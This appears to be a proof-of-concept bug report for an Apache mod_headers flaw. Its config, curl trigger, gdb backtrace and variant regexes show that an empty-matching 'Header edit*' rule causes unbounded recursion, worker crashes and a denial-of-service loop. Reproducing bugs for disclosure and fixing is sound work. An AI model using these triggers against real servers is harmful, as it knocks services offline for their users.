# PoC 075 - mod_headers `edit*` Zero-Length Match Recursion

`process_regexp()` recurses on `value + pmatch[0].rm_eo` without progress
checks; an `edit*` regex that matches the empty string blows the stack.

## Setup

`httpd.conf`:

```apache
ServerName localhost
Listen 8080
LoadModule mpm_event_module modules/mod_mpm_event.so
LoadModule authn_core_module modules/mod_authn_core.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule unixd_module modules/mod_unixd.so
LoadModule log_config_module modules/mod_log_config.so
LoadModule headers_module modules/mod_headers.so

ErrorLog logs/error_log
LogLevel debug

DocumentRoot "/srv/www"
<Directory "/srv/www">
    Require all granted
</Directory>

# Zero-length match: ^ matches at offset 0, rm_so == rm_eo == 0.
Header always edit* X-Test "^" "prefix-"

<Location "/">
    Header always set X-Test "value"
</Location>
```

Make `/srv/www/index.html` non-empty.

## Trigger

```bash
ulimit -s 1024   # smaller stack makes the crash deterministic.
sudo ./httpd -X -f /etc/apache2/httpd.conf &
HTTPD_PID=$!
curl -i http://127.0.0.1:8080/
```

## Observed effect

The worker recurses without bound inside `process_regexp()` until the stack
guard page is hit. Behaviour depends on platform:

- Linux: `SIGSEGV` from stack overflow. `dmesg` shows
  `httpd[NN]: segfault at <addr> ... in libc`.
- macOS: `EXC_BAD_ACCESS (KERN_PROTECTION_FAILURE)` killing the worker.

Verify with gdb:

```bash
gdb -p $HTTPD_PID
(gdb) continue
# After curl runs:
Program received signal SIGSEGV, Segmentation fault.
0x... in process_regexp (hdr=..., value="value", r=...) at mod_headers.c:649
(gdb) bt 5
#0  process_regexp (...) at mod_headers.c:649
#1  process_regexp (...) at mod_headers.c:649
#2  process_regexp (...) at mod_headers.c:649
#3  process_regexp (...) at mod_headers.c:649
#4  process_regexp (...) at mod_headers.c:649
```

The repeated frames confirm the unbounded recursion through
`value + pmatch[0].rm_eo` with `rm_eo == 0`.

## Log marker

`error_log`:

```text
[core:notice] AH00052: child pid <pid> exit signal Segmentation fault (11)
```

`mpm_event` immediately spawns a replacement worker, so each request that hits
the rule kills one worker; sustained traffic causes a denial-of-service loop.

## Variant

Equivalent triggers:

```apache
Header always edit* X-Test "" "prefix"
Header always edit* X-Test "a*" "Z"   # matches empty string between letters
```
